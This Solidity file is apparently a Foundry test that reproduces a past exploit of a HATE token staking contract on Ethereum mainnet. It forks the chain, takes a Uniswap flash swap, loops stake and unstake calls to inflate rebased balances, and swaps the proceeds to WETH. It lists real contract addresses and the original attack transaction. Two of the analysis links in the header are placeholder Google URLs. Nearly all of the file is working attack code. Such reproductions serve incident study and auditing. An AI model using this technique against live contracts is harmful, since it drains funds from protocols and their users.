// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~6ETH
// Attacker : https://etherscan.io/address/0x6ce9fa08f139f5e48bc607845e57efe9aa34c9f6
// Attack Contract : https://etherscan.io/address/0x8faa53a742fc732b04db4090a21e955fe5c230be
// Attack Tx : https://etherscan.io/tx/0xe28ca1f43036f4768776805fb50906f8172f75eba3bf1d9866bcd64361fda834

// @Analysis
// Post-mortem : https://www.google.com/
// Twitter Guy : https://twitter.com/hexagate_/status/1699003711937216905
// Hacking God : https://www.google.com/


interface Staking{
    function stake(address _to, uint256 _amount) external;

    function unstake(address _to, uint256 _amount, bool _rebase) external;

    function rebase() external ;
}

interface IsHATE is IERC20 {
    function rebase(uint256 amount_, uint epoch_) external returns (uint256);

    function circulatingSupply() external view returns (uint256);

}


contract ContractTest is Test {
    IERC20 HATE = IERC20(0x7b768470590B8A0d28fC714d0A70754d556D14eD);
    IWETH WETH = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
    Uni_Pair_V2 HATE_ETH_Pair = Uni_Pair_V2(0x738dab4AF8D21b7aafb73545D79D3B4831eE79dA);
    Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Staking HATEStaking = Staking(0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8);
    IsHATE sHATE = IsHATE(0xf829d7014Db17D6DCe448bE958c7e4983cdb1F77);
    uint amount = 907_615_399_181_304;

    function setUp() public {
        vm.createSelectFork("mainnet", 18069528 - 1);
        vm.label(address(HATE), "HATE");
        vm.label(address(WETH), "WETH");
        vm.label(address(HATE_ETH_Pair), "Uniswap HATE");
        vm.label(address(HATEStaking), "HATEStaking");
        vm.label(address(sHATE), "sHATE");
        approveAll();
    }

    function testExploit() external{
        console.log("Before Start: %d ETH", WETH.balanceOf(address(this)));
        HATE_ETH_Pair.swap(amount,0, address(this), abi.encode(3));
        address[] memory path = new address[](2);
        (path[0], path[1]) = (address(HATE), address(WETH));
        uniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(HATE.balanceOf(address(this)), 0, path,
                                                                     address(this), type(uint256).max);
        uint intRes =  WETH.balanceOf(address(this))/1 ether;
        uint decRes =  WETH.balanceOf(address(this)) - intRes * 1e18;
        console.log("Attack Exploit: %s.%s ETH", intRes, decRes);
    }

     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
         uint stakeAmount = amount;
         while(true){
             HATEStaking.stake(address(this), stakeAmount);
             stakeAmount = sHATE.balanceOf(address(this));
             HATEStaking.unstake(address(this), stakeAmount, true);
             if(stakeAmount > 1_468_562_883_234_511){
                break;
             }
         }
         HATE.transfer(address(HATE_ETH_Pair), uint(amount*1000/997) +1);
    }

    function approveAll() internal {
        HATE.approve(address(HATEStaking), type(uint256).max);
        HATE.approve(address(uniRouter), type(uint256).max);
        sHATE.approve(address(HATEStaking), type(uint256).max);
    }
}
